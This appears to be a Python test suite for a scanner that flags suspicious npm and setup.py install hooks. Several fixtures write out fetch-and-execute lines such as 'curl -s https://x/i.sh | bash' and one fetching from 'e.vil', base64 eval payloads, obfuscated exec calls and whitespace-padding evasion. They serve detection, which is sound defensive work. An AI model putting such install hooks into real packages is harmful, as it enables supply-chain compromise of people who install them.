import base64
import json
import os
import time

import pytest

from mandacaru.events import Severity
from mandacaru.projeto.achado import ArquivoIlegivel
from mandacaru.projeto.instalar import verificar


def _pkg(projeto, scripts, extras=None, rel="package.json"):
    texto = json.dumps({"scripts": scripts}, indent=2)
    arquivos = {rel: texto, **(extras or {})}
    raiz = projeto(arquivos)
    return verificar(raiz, rel, texto), texto


def test_postinstall_comum_e_low(projeto):
    achados, _ = _pkg(projeto, {"prepare": "husky"})
    assert [(a.regra, a.severidade) for a in achados] == [("projeto.instalar.script_npm", Severity.LOW)]
    assert achados[0].mitre == ("T1195.002", "T1059")


def test_script_nao_instalacao_ignorado(projeto):
    achados, _ = _pkg(projeto, {"build": "curl x | sh", "test": "jest"})
    assert achados == []


def test_postinstall_baixa_e_executa(projeto):
    achados, texto = _pkg(projeto, {"postinstall": "curl -s https://x/i.sh | bash"})
    assert [a.severidade for a in achados] == [Severity.HIGH]
    assert achados[0].linha == texto.splitlines().index('    "postinstall": "curl -s https://x/i.sh | bash"') + 1


def test_node_e_base64(projeto):
    achados, _ = _pkg(projeto, {"install": "node -e \"eval(Buffer.from('aGk=','base64').toString())\""})
    assert achados[0].severidade == Severity.HIGH


def test_postinstall_chama_script_ofuscado(projeto):
    blob = base64.b64encode(os.urandom(225)).decode()
    js = f'eval(atob("{blob}"))\n'
    achados, _ = _pkg(projeto, {"postinstall": "node scripts/i.js"}, {"scripts/i.js": js})
    assert achados[0].severidade == Severity.HIGH


def test_script_em_subpasta_resolve_relativo(projeto):
    blob = base64.b64encode(os.urandom(225)).decode()
    achados, _ = _pkg(projeto, {"postinstall": "node i.js"},
                      {"app/i.js": f'eval(atob("{blob}"))\n'}, rel="app/package.json")
    assert achados[0].severidade == Severity.HIGH


def test_script_limpo_fica_low(projeto):
    achados, _ = _pkg(projeto, {"postinstall": "node i.js"}, {"i.js": "console.log('ok')\n"})
    assert achados[0].severidade == Severity.LOW


def test_postinstall_fora_da_raiz_ignorado(projeto, tmp_path):
    blob = base64.b64encode(os.urandom(225)).decode()
    raiz = tmp_path / "proj"
    raiz.mkdir()
    (tmp_path / "x.js").write_text(f'eval(atob("{blob}"))\n')
    texto = json.dumps({"scripts": {"postinstall": "node ../x.js"}})
    (raiz / "package.json").write_text(texto)
    achados = verificar(raiz, "package.json", texto)
    assert [a.severidade for a in achados] == [Severity.LOW]


def test_script_via_link_simbolico_ignorado(tmp_path):
    fora = tmp_path / "fora"
    fora.mkdir()
    blob = base64.b64encode(os.urandom(225)).decode()
    (fora / "i.js").write_text(f'eval(atob("{blob}"))\n')
    raiz = tmp_path / "proj"
    raiz.mkdir()
    (raiz / "d").symlink_to(fora)
    (raiz / "l.js").symlink_to(fora / "i.js")
    for cmd in ("node d/i.js", "node l.js"):
        texto = json.dumps({"scripts": {"postinstall": cmd}})
        assert [a.severidade for a in verificar(raiz, "package.json", texto)] == [Severity.LOW]


def test_package_json_malformado(projeto):
    raiz = projeto({})
    with pytest.raises(ArquivoIlegivel):
        verificar(raiz, "package.json", "{")
    assert verificar(raiz, "package.json", '{"scripts": "x"}') == []
    assert verificar(raiz, "package.json", '{"scripts": {"install": ["a"], "prepare": 3}}') == []
    assert verificar(raiz, "package.json", "[1]") == []


def test_aninhamento_hostil_levanta_ilegivel(projeto):
    raiz = projeto({})
    with pytest.raises(ArquivoIlegivel):
        verificar(raiz, "package.json", "[" * 100000)


def test_setup_py_rede(projeto):
    texto = "import urllib.request\nurllib.request.urlopen('http://x')\nfrom setuptools import setup\nsetup()"
    raiz = projeto({"setup.py": texto})
    achados = verificar(raiz, "setup.py", texto)
    assert [(a.regra, a.severidade, a.linha) for a in achados] == [("projeto.instalar.setup_py", Severity.HIGH, 1)]
    assert achados[0].mitre == ("T1195.002",)


def test_setup_py_comum(projeto):
    texto = "from setuptools import setup\nsetup(name='x')"
    assert verificar(projeto({"setup.py": texto}), "setup.py", texto) == []


@pytest.mark.parametrize("texto", [
    "import os\nos.system('curl http://x | sh')\n",
    "import subprocess\nsubprocess.run(['wget', 'x'])\n",
    "import base64\nexec(base64.b64decode('aGk='))\n",
    "import zlib\neval(zlib.decompress(b'x'))\n",
    "exec(bytes.fromhex('6869'))\n",
    "import codecs\nexec(codecs.decode('uryyb', 'rot13'))\n",
    "from setuptools import setup\nclass C:\n    def run(self):\n        import requests\n",
    "from http.client import HTTPConnection\n",
])
def test_setup_py_outros_gatilhos(projeto, texto):
    achados = verificar(projeto({"setup.py": texto}), "setup.py", texto)
    assert [a.severidade for a in achados] == [Severity.HIGH]


@pytest.mark.parametrize("texto", [
    "import os\nos.system('make')\n",
    "exec('x = 1')\n",
    "import http\n",
    "# import requests\nx = 'import socket'\n",
])
def test_setup_py_sem_gatilho(projeto, texto):
    assert verificar(projeto({"setup.py": texto}), "setup.py", texto) == []


def test_setup_py_sintaxe_invalida_usa_regex(projeto):
    texto = "def (:\nimport requests\n"
    achados = verificar(projeto({"setup.py": texto}), "setup.py", texto)
    assert [(a.severidade, a.linha) for a in achados] == [(Severity.HIGH, 2)]
    texto = "def (:\nexec(base64.b64decode(x))\n"
    assert verificar(projeto({"setup.py": texto}), "setup.py", texto)[0].linha == 2
    texto = "def (:\nsetup(name='x')\n"
    assert verificar(projeto({"setup.py": texto}), "setup.py", texto) == []


def test_backend_local(projeto):
    texto = '[build-system]\nbackend-path = ["."]\n'
    achados = verificar(projeto({"pyproject.toml": texto}), "pyproject.toml", texto)
    assert [(a.regra, a.severidade, a.linha) for a in achados] == [("projeto.instalar.backend_local", Severity.LOW, 2)]


def test_pyproject_sem_backend_local_ou_tipos_errados(projeto):
    raiz = projeto({})
    for texto in ('[build-system]\nrequires = ["x"]\n', '[build-system]\nbackend-path = "."\n',
                  'build-system = 3\n', '[build-system]\nbackend-path = []\n'):
        assert verificar(raiz, "pyproject.toml", texto) == []


def test_pyproject_invalido(projeto):
    with pytest.raises(ArquivoIlegivel):
        verificar(projeto({}), "pyproject.toml", "[build-system\n")


def test_outro_arquivo_ignorado(projeto):
    assert verificar(projeto({}), "README.md", "import requests") == []


@pytest.mark.parametrize("texto", [
    "os.system(" * 200000,
    "exec(" * 400000,
    "import " * 300000,
    "def (:\n" + "subprocess.run(" * 100000,
])
def test_setup_py_hostil_e_rapido(projeto, texto):
    raiz = projeto({})
    t = time.perf_counter()
    verificar(raiz, "setup.py", texto)
    assert time.perf_counter() - t < 1


def test_comando_npm_hostil_e_rapido(projeto):
    raiz = projeto({})
    for cmd in ("node " * 5000, "node -e " * 5000, "node a" + " " * 9000):
        texto = json.dumps({"scripts": {"install": cmd}})
        t = time.perf_counter()
        verificar(raiz, "package.json", texto)
        assert time.perf_counter() - t < 1


def test_nul_no_caminho_do_node_nao_quebra(projeto):
    achados, _ = _pkg(projeto, {"postinstall": "node a\x00b.js"})
    assert [a.severidade for a in achados] == [Severity.LOW]


def test_preenchimento_nao_esconde_baixa_e_executa(projeto):
    achados, _ = _pkg(projeto, {"postinstall": " " * 10_050 + "curl -s https://x/i.sh | bash"})
    assert [a.severidade for a in achados] == [Severity.HIGH]


def test_setup_py_trecho_com_form_feed_antes(projeto):
    texto = "a = 1\x0c\nb = 2\nimport requests\n"
    achados = verificar(projeto({}), "setup.py", texto)
    assert (achados[0].linha, achados[0].trecho) == (3, "import requests")


def test_script_de_shell_com_pipe_no_fim_da_linha(projeto):
    achados, _ = _pkg(projeto, {"postinstall": "bash scripts/setup.sh"},
                      {"scripts/setup.sh": "#!/bin/sh\ncurl -fsSL https://e.vil/i.sh |\n  sh\n"})
    assert [a.severidade for a in achados] == [Severity.HIGH]
